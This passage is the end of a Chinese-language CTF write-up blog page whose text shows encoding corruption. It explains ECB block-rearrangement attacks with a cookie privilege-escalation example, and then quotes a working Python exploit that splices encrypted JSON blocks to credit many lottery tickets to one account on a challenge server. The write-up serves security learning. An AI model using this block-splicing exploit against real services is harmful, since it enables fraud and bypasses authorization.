</code></pre></div><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–ä½¿ç”¨äº†EBCæ¨¡å¼å’Œ<code>rijndael256</code>æ¥å¯¹<code>enc</code>è¿›è¡ŒåŠ å¯†ï¼›</p>
<h4 id="ebcåŠ å¯†æ¨¡å¼">EBCåŠ å¯†æ¨¡å¼</h4>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144116.png" alt="http://p3.qhimg.com/t01b53d433f418eb7da.png"  /></p>
<blockquote>
<p>ECBæ¨¡å¼æ˜¯æ‰€æœ‰æ¨¡å¼ä¸­æœ€ç®€å•çš„ä¸€ç§ã€‚æ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå¦‚æœæ˜æ–‡åˆ†ç»„æœ‰ç›¸åŒçš„é‚£ä¹ˆæœ€åçš„å¯†æ–‡ä¸­ä¹Ÿä¼šæœ‰ç›¸åŒçš„å¯†æ–‡åˆ†ç»„ã€‚</p>
<p>å› ä¸ºæ¯ä¸ªåˆ†ç»„éƒ½ç‹¬è‡ªè¿›è¡ŒåŠ å¯†è§£å¯†ï¼Œæ‰€ä»¥æ— éœ€ç ´è§£å¯†æ–‡å°±èƒ½æ“çºµéƒ¨åˆ†æ˜æ–‡ï¼Œæˆ–è€…æ”¹å˜æ˜æ–‡ï¼Œåœ¨ä¸çŸ¥é“åŠ å¯†ç®—æ³•çš„æƒ…å†µä¸‹å¾—åˆ°å¯†æ–‡ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»æ•ˆæœï¼Œå¦‚å›¾æ‰€ç¤ºï¼ˆç¿»è½¬å¯†æ–‡åˆ†ç»„ï¼Œé‚£ä¹ˆæ˜æ–‡åˆ†ç»„ä¹Ÿä¼šè¢«ç¿»è½¬ï¼‰</p>
</blockquote>
<h4 id="ecbå—é‡æ’æ”»å‡»">ECBå—é‡æ’æ”»å‡»</h4>
<p>å‰æ–‡è¯´è¿‡ï¼Œåœ¨å—åŠ å¯†ä¸­ECBæ¨¡å¼ä¸­æ¯ä¸ªå—éƒ½æ˜¯ç‹¬ç«‹åŠ å¯†çš„ã€‚å› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨æœªçŸ¥å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œå¯¹å¯†æ–‡ä¸­çš„å—è¿›è¡Œé‡æ–°æ’åˆ—ï¼Œç»„åˆæˆåˆæ³•çš„å¯è§£å¯†çš„æ–°å¯†æ–‡ã€‚</p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼ŒæŸCMSçš„cookieæ ¼å¼ä¸ºDES-ECBåŠ å¯†åçš„æ•°æ®ï¼Œè€Œæ˜æ–‡æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code>admin=0;username=pan
</code></pre><p>ç”±äºDESä½¿ç”¨çš„å—å¤§å°æ˜¯8å­—èŠ‚ï¼Œå› æ­¤ä¸Šè¿°æ˜æ–‡å¯ä»¥åˆ‡åˆ†æˆä¸‰ä¸ªå—ï¼Œå…¶ä¸­<code>@</code>ä¸ºå¡«å……ç¬¦å·ï¼š</p>
<pre><code>admin=0;
username
=pan@@@@
</code></pre><p>å‡è®¾æˆ‘ä»¬å¯ä»¥æ§åˆ¶è‡ªå·±çš„ç”¨æˆ·åï¼ˆåœ¨æ³¨å†Œæ—¶ï¼‰ï¼Œé‚£ä¹ˆæœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹å°†è‡ªå·±æå–ä¸ºç®¡ç†å‘˜å‘¢ï¼ˆå³admin=1ï¼‰ï¼Ÿé¦–å…ˆå°†ç”¨æˆ·åè®¾ç½®ä¸º<code>pan@@@@admin=1;</code>ï¼Œæ­¤æ—¶æ˜æ–‡å—çš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code>admin=0;username=pan@@@@admin=1;
</code></pre><p>æˆ‘ä»¬æ‰€éœ€è¦åšçš„ï¼Œå°±æ˜¯åœ¨åŠ å¯†å®Œæˆåï¼Œå°†æœåŠ¡å™¨è¿”å›çš„cookieä½¿ç”¨æœ€åä¸€ä¸ªå—æ›¿æ¢ç¬¬ä¸€ä¸ªå—ï¼Œè¿™æ ·ä¸€æ¥å°±è·å¾—äº†ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„åˆæ³•cookieäº†ã€‚</p>
<h4 id="å›åˆ°é¢˜ç›®">å›åˆ°é¢˜ç›®</h4>
<p>è¯·æ±‚<code>/lottery/buy</code>è·¯ç”±çš„æ—¶å€™ï¼Œç”±äºä½¿ç”¨çš„æ˜¯EBCæ¨¡å¼çš„åŠ å¯†ï¼Œæ¯ä¸€å—å¯†æ–‡ç›´æ¥ä¸æ˜æ–‡å¯¹åº”</p>
<p>è€Œè¯·æ±‚<code>/lottery/charge</code>çš„æ—¶å€™æœåŠ¡ç«¯ç›´æ¥è§£å¯†æˆ‘ä»¬ä¼ è¿‡å»çš„encï¼Œæ ¹æ®lotteryçš„uuidå’Œuserçš„uuidæ¥æŠŠlotteryçš„é‡‘é¢åŠ å…¥è´¦æˆ·ä½™é¢ã€‚</p>
<p>åˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬ä¾¿å¯ä»¥æ³¨å†Œå¤šä¸ªè´¦æˆ·ï¼Œç”Ÿæˆå¤šä¸ªlotteryçš„uuidå¹¶ä¸”é€šè¿‡æŠŠlotteryçš„uuidæ‹¼æ¥åˆ°è¯·æ±‚<code>/lottery/charge</code>æ—¶çš„encï¼Œæ¥è®©å¤šä¸ªlotteryçš„é‡‘é¢å­˜åˆ°åŒä¸€ä¸ªuserï¼Œåˆ·é’±ã€‚</p>
<p>æœ¬é¢˜ä½¿ç”¨çš„æ˜¯<code>MCRYPT_RIJNDAEL_256</code>åŠ å¯†ï¼Œ<code>rijndael128</code>ä¸<code>aes</code>ç›¸åŒï¼Œéƒ½æ˜¯ä»¥128ä½ä¸ºä¸€ä¸ªå—åŠ å¯†ï¼Œ<code>rijndael256</code>åˆ™æ˜¯ä»¥256ä½ä¸ºä¸€ä¸ªå—ï¼Œå³32å­—èŠ‚ã€‚</p>
<p>å¯¹äºä¸€ä¸ªencè€Œè¨€ï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;lottery&#34;</span><span class="p">:</span><span class="s2">&#34;bb9c4db6-d339-4a26-9|397-caeb4bfe043e&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&#34;</span><span class="p">,</span><span class="err">|</span><span class="nt">&#34;coin&#34;</span><span class="p">:</span><span class="mi">6</span><span class="p">}</span><span class="err">@@@@@@@@@@@@@@@@@@@@@@@</span>
<span class="err">//@æ˜¯å¡«å……</span>
</code></pre></div><p>å¯ä»¥çœ‹åˆ°æ— è®ºæˆ‘ä»¬æ›¿æ¢å“ªä¸€å—ï¼Œéƒ½æ²¡æœ‰åŠæ³•å®Œå…¨æ§åˆ¶useræˆ–è€…lotteryï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠç¬¬ä¸€å•lotteryçš„1ï¼Œ2å—åŠ ä¸Šç¬¬äºŒå•lotteryçš„2ï¼Œ3ï¼Œ4å—ï¼Œæ„æˆç±»ä¼¼äºä¸‹é¢çš„payloadï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;lottery&#34;</span><span class="p">:</span><span class="s2">&#34;1287901b-89d7-4b94-a|0d7-a7655d85800d&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|397-caeb4bfe043e&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&#34;</span><span class="p">,</span><span class="err">|</span><span class="nt">&#34;coin&#34;</span><span class="p">:</span><span class="mi">6</span><span class="p">}</span><span class="err">@@@@@@@@@@@@@@@@@@@@@@@</span>
</code></pre></div><p>å‰é¢çš„useråœ¨json_decodeä¹‹åä¼šè¢«åé¢çš„useræ‰€è¦†ç›–ï¼Œå½¢æˆäº†userä¸å˜è€Œlotteryä»»æ„æ§åˆ¶çš„å±€é¢</p>
<p>è´´ä¸€ä¸ªJrXnmå¸ˆå‚…çš„expï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="n">user_token</span> <span class="o">=</span> <span class="s2">&#34;Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD&#34;</span>
<span class="n">user_uuid</span> <span class="o">=</span> <span class="s2">&#34;ae4774be-2e44-49d2-82dc-6c69c57c4378&#34;</span>
<span class="n">user_enc</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;+Zza7U18mMFaHhYyrTaOr\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM=&#34;</span>

<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&#34;api_token&#34;</span><span class="p">:</span> <span class="n">user_token</span>
<span class="p">}</span>

<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://52.149.144.45:8080&#34;</span>

<span class="k">def</span> <span class="nf">get_random</span><span class="p">():</span>
    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="n">username</span><span class="o">=</span><span class="n">get_random</span><span class="p">()</span>
    <span class="n">data</span><span class="o">=</span> <span class="p">{</span>
            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;asdasd&#34;</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/register&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="n">username</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;asdasd&#34;</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/login&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/info?api_token=&#34;</span> <span class="o">+</span> <span class="n">api_token</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;uuid: &#39;</span><span class="o">+</span><span class="n">d</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;uuid&#39;</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">api_key</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;api_token&#34;</span><span class="p">:</span> <span class="n">api_key</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/lottery/buy&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="c1">#print(res.text)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
    <span class="n">o</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
    <span class="n">u</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">user_enc</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">o</span><span class="p">[:</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">u</span><span class="p">[</span><span class="mi">32</span><span class="p">:])</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;enc: &#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">charge</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;user&#34;</span><span class="p">:</span> <span class="n">user_uuid</span><span class="p">,</span>
        <span class="s2">&#34;enc&#34;</span><span class="p">:</span> <span class="n">enc</span><span class="p">,</span>
        <span class="s2">&#34;coin&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/lottery/charge&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;charge: &#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">username</span> <span class="o">=</span> <span class="n">register</span><span class="p">()</span>
            <span class="n">api_token</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
            <span class="n">enc</span> <span class="o">=</span> <span class="n">buy</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
            <span class="n">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
            <span class="n">mo_enc</span> <span class="o">=</span> <span class="n">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
            <span class="n">charge</span><span class="p">(</span><span class="n">mo_enc</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>
</code></pre></div><p>JrXnmå¸ˆå‚…tqlï¼Œè†œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144130.png" alt=""  /></p>
<h3 id="oh-my-bet">oh-my-bet</h3>
<p>è€ƒç‚¹ï¼š</p>
<p>å‚è€ƒï¼š</p>
<blockquote>
<p><a class="link" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485857&amp;idx=1&amp;sn=1cf534df42999d5126fc3cf3b7fc8f9b&amp;chksm=fd711cecca0695faf313845fb30671cd61feee2a62ad9b13f213d4de7a5b64c0dfbb6d2ac31f&amp;mpshare=1&amp;scene=23&amp;srcid=0119de31ZoFyjJWQIqWvKnuh&amp;sharer_sharetime=1611032814136&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd"  target="_blank" rel="noopener"
    >*CTF Writeup by æ˜Ÿç›Ÿ</a></p>
<p><a class="link" href="https://bbs.pediy.com/thread-259355.htm"  target="_blank" rel="noopener"
    >å¯¹ç§°åŠ å¯†ä¸æ”»å‡»æ¡ˆä¾‹åˆ†æ</a></p>
</blockquote>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

     
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2019 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>

    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
